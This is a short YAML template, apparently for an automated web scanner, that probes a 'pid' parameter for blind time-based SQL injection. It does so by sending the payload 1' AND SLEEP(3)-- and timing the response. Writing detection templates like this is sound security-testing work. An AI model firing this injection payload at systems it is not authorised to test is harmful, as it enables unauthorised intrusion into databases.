id: sqli-time3-569
name: 'Delay probe in pid'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via pid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      pid:
        - '1''%09AND%09SLEEP(3)--'
    matchers:
      - type: time
        ms: 2500
